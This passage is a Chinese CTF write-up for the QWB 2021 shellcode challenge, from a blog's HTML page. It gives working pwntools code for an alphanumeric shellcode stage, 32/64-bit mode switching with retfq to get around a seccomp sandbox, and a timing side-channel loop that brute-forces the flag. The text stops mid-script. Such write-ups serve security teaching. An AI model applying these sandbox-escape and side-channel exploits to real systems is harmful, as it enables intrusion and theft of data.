@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>qwb2021_shellcode | Lingze&#39;s blog</title>
+    <meta name="generator" content="VuePress 1.8.0">
+    <link rel="icon" href="/img/favicon.ico">
+    <meta name="description" content="ctfer">
+    <meta name="keywords" content="ctfer">
+    <meta name="theme-color" content="#11a8cd">
+    
+    <link rel="preload" href="/assets/css/0.styles.415d0a97.css" as="style"><link rel="preload" href="/assets/js/app.01f8cc77.js" as="script"><link rel="preload" href="/assets/js/2.5ece5099.js" as="script"><link rel="preload" href="/assets/js/37.8e60e299.js" as="script"><link rel="prefetch" href="/assets/js/10.f923d8b8.js"><link rel="prefetch" href="/assets/js/100.cf64d3e9.js"><link rel="prefetch" href="/assets/js/11.19955ff8.js"><link rel="prefetch" href="/assets/js/12.e16d4c4d.js"><link rel="prefetch" href="/assets/js/13.0552f541.js"><link rel="prefetch" href="/assets/js/14.78d67d73.js"><link rel="prefetch" href="/assets/js/15.d342dfc4.js"><link rel="prefetch" href="/assets/js/16.36f247d6.js"><link rel="prefetch" href="/assets/js/17.031ae63f.js"><link rel="prefetch" href="/assets/js/18.7c49a89e.js"><link rel="prefetch" href="/assets/js/19.2d69c943.js"><link rel="prefetch" href="/assets/js/20.e845eb34.js"><link rel="prefetch" href="/assets/js/21.e398898d.js"><link rel="prefetch" href="/assets/js/22.6efd51e5.js"><link rel="prefetch" href="/assets/js/23.21d2b263.js"><link rel="prefetch" href="/assets/js/24.3231fe48.js"><link rel="prefetch" href="/assets/js/25.26e66a19.js"><link rel="prefetch" href="/assets/js/26.ddde99c2.js"><link rel="prefetch" href="/assets/js/27.f8e523dc.js"><link rel="prefetch" href="/assets/js/28.2c1ddb1d.js"><link rel="prefetch" href="/assets/js/29.f15cca3e.js"><link rel="prefetch" href="/assets/js/3.c087139c.js"><link rel="prefetch" href="/assets/js/30.2d433b5b.js"><link rel="prefetch" href="/assets/js/31.87dbaed0.js"><link rel="prefetch" href="/assets/js/32.045dc002.js"><link rel="prefetch" href="/assets/js/33.db01bde8.js"><link rel="prefetch" href="/assets/js/34.d177d280.js"><link rel="prefetch" href="/assets/js/35.360c2104.js"><link rel="prefetch" href="/assets/js/36.afbabc8a.js"><link rel="prefetch" href="/assets/js/38.c6a43a23.js"><link rel="prefetch" href="/assets/js/39.08102dc6.js"><link rel="prefetch" href="/assets/js/4.28fb810e.js"><link rel="prefetch" href="/assets/js/40.5767c7d7.js"><link rel="prefetch" href="/assets/js/41.307bcf10.js"><link rel="prefetch" href="/assets/js/42.daf03989.js"><link rel="prefetch" href="/assets/js/43.952d68dc.js"><link rel="prefetch" href="/assets/js/44.cbeef42b.js"><link rel="prefetch" href="/assets/js/45.fbd2a9f2.js"><link rel="prefetch" href="/assets/js/46.a92ae456.js"><link rel="prefetch" href="/assets/js/47.24f82953.js"><link rel="prefetch" href="/assets/js/48.fa3498f4.js"><link rel="prefetch" href="/assets/js/49.a64774f2.js"><link rel="prefetch" href="/assets/js/5.0660e0b3.js"><link rel="prefetch" href="/assets/js/50.d0ed88cd.js"><link rel="prefetch" href="/assets/js/51.50727b96.js"><link rel="prefetch" href="/assets/js/52.2756affe.js"><link rel="prefetch" href="/assets/js/53.2739f473.js"><link rel="prefetch" href="/assets/js/54.f0b71120.js"><link rel="prefetch" href="/assets/js/55.94d5a5ee.js"><link rel="prefetch" href="/assets/js/56.637c3b4a.js"><link rel="prefetch" href="/assets/js/57.7b7e3fee.js"><link rel="prefetch" href="/assets/js/58.812bae5d.js"><link rel="prefetch" href="/assets/js/59.70fe1d63.js"><link rel="prefetch" href="/assets/js/6.c52e1544.js"><link rel="prefetch" href="/assets/js/60.0e6a01d3.js"><link rel="prefetch" href="/assets/js/61.702e5198.js"><link rel="prefetch" href="/assets/js/62.38f55e44.js"><link rel="prefetch" href="/assets/js/63.b505c9de.js"><link rel="prefetch" href="/assets/js/64.5489c9d8.js"><link rel="prefetch" href="/assets/js/65.3db6e034.js"><link rel="prefetch" href="/assets/js/66.3605a461.js"><link rel="prefetch" href="/assets/js/67.00d97ed9.js"><link rel="prefetch" href="/assets/js/68.78ef741a.js"><link rel="prefetch" href="/assets/js/69.808ca1f4.js"><link rel="prefetch" href="/assets/js/7.9920c8ea.js"><link rel="prefetch" href="/assets/js/70.15347f58.js"><link rel="prefetch" href="/assets/js/71.b9acfd65.js"><link rel="prefetch" href="/assets/js/72.7e1140f3.js"><link rel="prefetch" href="/assets/js/73.874f0e99.js"><link rel="prefetch" href="/assets/js/74.117bb7d4.js"><link rel="prefetch" href="/assets/js/75.964e2dfe.js"><link rel="prefetch" href="/assets/js/76.2df26afd.js"><link rel="prefetch" href="/assets/js/77.93ebe7b7.js"><link rel="prefetch" href="/assets/js/78.67c6c9bb.js"><link rel="prefetch" href="/assets/js/79.0d846438.js"><link rel="prefetch" href="/assets/js/8.f3c32733.js"><link rel="prefetch" href="/assets/js/80.4716a5b6.js"><link rel="prefetch" href="/assets/js/81.d8c3b2d2.js"><link rel="prefetch" href="/assets/js/82.ea63e06a.js"><link rel="prefetch" href="/assets/js/83.4d1ef8ae.js"><link rel="prefetch" href="/assets/js/84.32a22fe7.js"><link rel="prefetch" href="/assets/js/85.7fb3f862.js"><link rel="prefetch" href="/assets/js/86.4d386fc9.js"><link rel="prefetch" href="/assets/js/87.a095878a.js"><link rel="prefetch" href="/assets/js/88.69d77356.js"><link rel="prefetch" href="/assets/js/89.21ebadb4.js"><link rel="prefetch" href="/assets/js/9.d8b27656.js"><link rel="prefetch" href="/assets/js/90.d49929b7.js"><link rel="prefetch" href="/assets/js/91.cc956227.js"><link rel="prefetch" href="/assets/js/92.b72e3535.js"><link rel="prefetch" href="/assets/js/93.a76f52a2.js"><link rel="prefetch" href="/assets/js/94.82a77dbd.js"><link rel="prefetch" href="/assets/js/95.b0cec47e.js"><link rel="prefetch" href="/assets/js/96.87307703.js"><link rel="prefetch" href="/assets/js/97.c731aa62.js"><link rel="prefetch" href="/assets/js/98.1e36c988.js"><link rel="prefetch" href="/assets/js/99.914f1e07.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.415d0a97.css">
+  </head>
+  <body class="theme-mode-light">
+    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open no-sidebar have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Lingze's blog" class="logo"> <span class="site-name can-hide">Lingze's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/avatar2.jpg"> <div class="blogger-info"><h3>lingze</h3> <span>bin不是垃圾桶的意思!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav>  <!----> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-1baff76c><div class="articleInfo" data-v-1baff76c><ul class="breadcrumbs" data-v-1baff76c><li data-v-1baff76c><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1baff76c></a></li> <li data-v-1baff76c><a href="/categories/?category=ctf_wp" title="分类" data-v-1baff76c>ctf_wp</a></li><li data-v-1baff76c><a href="/categories/?category=qwb" title="分类" data-v-1baff76c>qwb</a></li></ul> <div class="info" data-v-1baff76c><div title="作者" class="author iconfont icon-touxiang" data-v-1baff76c><a href="https://github.com/wlingze" target="_blank" title="作者" class="beLink" data-v-1baff76c>lingze</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1baff76c><a href="javascript:;" data-v-1baff76c>2021-08-25</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">qwb2021_shellcode<!----></h1> <!----> <div class="theme-vdoing-content content__default"><h1 id="qwb2021-shellcode"><a href="#qwb2021-shellcode" class="header-anchor">#</a> qwb2021_shellcode</h1> <p></p><div class="table-of-contents"><ul><li><a href="#逆向">逆向</a></li><li><a href="#字符shellcode拓展">字符shellcode拓展</a></li><li><a href="#使用32位的系统调用">使用32位的系统调用</a></li><li><a href="#测信道时间爆破flag">测信道时间爆破flag</a></li><li><a href="#alarm时间获取flag">alarm时间获取flag</a></li></ul></div><p></p> <p>挺有趣的题目, 主要考察shellcode,  有点缝合怪的题目, 主要考点的话:</p> <ul><li>shellcode 拓展</li> <li>全字符shellcode</li> <li>32/64位切换</li> <li>无write函数测信道爆破</li></ul> <h2 id="逆向"><a href="#逆向" class="header-anchor">#</a> 逆向</h2> <p>应该是汇编写成的一个程序, 只有一个start函数, 主要代码如下:</p> <p>读取一段shellcode, 然后检测要为可见字符, 然后运行shellcode</p> <p><img src="https://i.loli.net/2021/08/25/FpUvwm7YbEXOqIx.png" alt="image-20210825150601209"></p> <p>通过sys_prctl设置了沙盒, 我们看下他的限制:</p> <p>flag相关的只留了一个read,</p> <p><img src="https://i.loli.net/2021/08/25/MLlS4h7xWXtfKvN.png" alt="image-20210825150715679"></p> <p>可以看到对构架和系统调用号都没有check,  可以通过retftq切换到32位,</p> <h2 id="字符shellcode拓展"><a href="#字符shellcode拓展" class="header-anchor">#</a> 字符shellcode拓展</h2> <p>首先先过第一部分,  字符shellcode的限制, 这里使用<a href="https://github.com/TaQini/alpha3" target="_blank" rel="noopener noreferrer">TaQini师傅改的alpha3<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>,</p> <p>首先写一个大概的模板, 然后写入第一段shellcode即可,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
+
+<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> asm<span class="token punctuation">(</span>sc<span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># read(0, 0x40404040, 0x1010) ax=3</span>
+read <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+'''</span><span class="token punctuation">)</span>
+
+sh <span class="token operator">=</span> read
+
+fo <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;shellcode&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span>
+fo<span class="token punctuation">.</span>write<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>这里因为我们要再读取一段shellcode进来, 但是没有啥地址, 于是我先mmap 获取一块地址, 然后read进来新的shellcode,</p> <div class="language-pyhton line-numbers-mode"><pre class="language-text"><code># read(0, 0x40404040, 0x1010) ax=3
+read = f('''
+mov rsi, 0x40404040;
+pushw 0x1010;
+pop rdx;
+xor rdi, rdi;
+push 0x3;
+pop rax;
+syscall;
+''')
+print(&quot;read: &quot;, read)
+
+# mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9
+mmap = f('''
+mov rdi, 0x40404040;
+push 0x7f;
+pop rsi;
+push 7;
+pop rdx;
+push 34;
+pop rcx;
+xor r8, r8;
+xor r9, r9;
+push 9;
+pop rax;
+syscall;
+''')
+print(&quot;mmap: &quot;, mmap)
+
+sh = mmap + read 
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><h2 id="使用32位的系统调用"><a href="#使用32位的系统调用" class="header-anchor">#</a> 使用32位的系统调用</h2> <p>因为要先打开flag然后读取,  这里我们需要一个open, 看下系统调用号:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>x64    syscall_number  x86
+fstat       5           open 
+alarm       37          kill
+read        0           restart_syscall      
+mmap        9           link
+exit_group  231         fgetxattr
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>我们切换到32位模式会有一个open函数,于是我们在前面read结束以后, 使用retfq, 然后再retfq回来,</p> <p>关于这个指令: 从栈中弹出ip和cs, 通过控制cs可以控制是32位还是64位,</p> <p>跳转到64位: cs=0x33, 跳转到32位: cs=0x23,</p> <p>于是我们直接跳过去, 遇到的问题有两个,</p> <p>一是当前要运行的汇编代码不正确, 这是因为我输入了一堆'a', 后续写入shellcode即可,</p> <p>二是栈空间出错, 原本是<code>rsp = 0x7fffe1161a3e</code>但是32位变成<code>esp = 0xe1161a4e</code> , 所以我们要先调整一下rsp即可,</p> <p><img src="https://i.loli.net/2021/08/25/OqeDF2UkG3yAgsE.png" alt="image-20210825175516680"></p> <p>修改后第一段shellcode:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># read(0, 0x40404040, 0x1010) ax=0</span>
+read <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+mov rsi, 0x40404040;
+pushw 0x1010;
+pop rdx;
+xor rdi, rdi;
+xor rax, rax;
+syscall;
+'''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;read: &quot;</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>
+
+<span class="token comment"># mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9</span>
+mmap <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+mov rdi, 0x40404040;
+push 0x7f;
+pop rsi;
+push 7;
+pop rdx;
+push 34;
+pop rcx;
+xor r8, r8;
+xor r9, r9;
+push 9;
+pop rax;
+syscall;
+'''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;mmap: &quot;</span><span class="token punctuation">,</span> mmap<span class="token punctuation">)</span>
+
+rsp <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+mov rsp, 0x40404f40
+'''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;rsp&quot;</span><span class="token punctuation">,</span> rsp<span class="token punctuation">)</span>
+
+to32 <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+push 0x23;
+push 0x40404040;
+retfq
+'''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;to32&quot;</span><span class="token punctuation">,</span> to32<span class="token punctuation">)</span>
+
+sh <span class="token operator">=</span> mmap <span class="token operator">+</span> read <span class="token operator">+</span> rsp <span class="token operator">+</span> to32
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>进入32位模式,  使用open, 但是read仍然在64位, 于是再切回去,</p> <p>而且这一次输入shellcode已经没有限制了, 于是可以直接shellcraft生成, 先打开文件,  然后retfq回到64位,</p> <p>这个回到64位以后的地址需要斟酌下,  32位没有办法构造输入, 那么sc2应该是:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>sc2 = openflag + to64 + readflag  + ...
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我们调试确定一下to64这一段中retfq的返回ip地址,</p> <p><img src="https://i.loli.net/2021/08/25/rbLcgQqJAZh72fs.png" alt="image-20210825182116194"></p> <p>成功读取到flag, 由于没有write, 下一步就是使用测信道思路, 通过时间爆破flag,</p> <p>目前的sc2部分:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	payload1 <span class="token operator">=</span> <span class="token string">&quot;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00&quot;</span>
+	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>cn<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
+	sl<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+	pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	openflag <span class="token operator">=</span> asm32<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;./flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	ret264 <span class="token operator">=</span> asm32<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+		push 0x33; 
+		push 0x40404065;
+		// retfq;
+		'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b&quot;H\xcb&quot;</span>
+	readflag <span class="token operator">=</span> asm64<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x40404840</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	check <span class="token operator">=</span> <span class="token string">b''</span> 
+	sc2 <span class="token operator">=</span> openflag <span class="token operator">+</span> ret264 <span class="token operator">+</span> readflag <span class="token operator">+</span> check
+	sl<span class="token punctuation">(</span>sc2<span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h2 id="测信道时间爆破flag"><a href="#测信道时间爆破flag" class="header-anchor">#</a> 测信道时间爆破flag</h2> <p>这一段思路就是cmp和jz, 如果这一位比较成功, 则死循环, 证明爆破成功,</p> <p>这样可以一个个字符爆破出来,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>reloc<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">if</span> reloc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+	    shellcode <span class="token operator">=</span> <span class="token string">&quot;cmp byte ptr[rsp+{0}], {1}; jz $-4; ret&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reloc<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+	    shellcode <span class="token operator">=</span> <span class="token string">&quot;cmp byte ptr[rsp+{0}], {1}; jz $-5; ret&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reloc<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	check <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>爆破部分编写:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+idx <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+	<span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./bin&quot;</span><span class="token punctuation">)</span>
+		exp<span class="token punctuation">(</span>idx<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>
+		start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+		<span class="token keyword">except</span><span class="token punctuation">:</span>
+			<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		cn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">1.5</span><span class="token punctuation">:</span>
+			flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">break</span>
+	idx <span class="token operator">+=</span> <span class="token number">1</span>
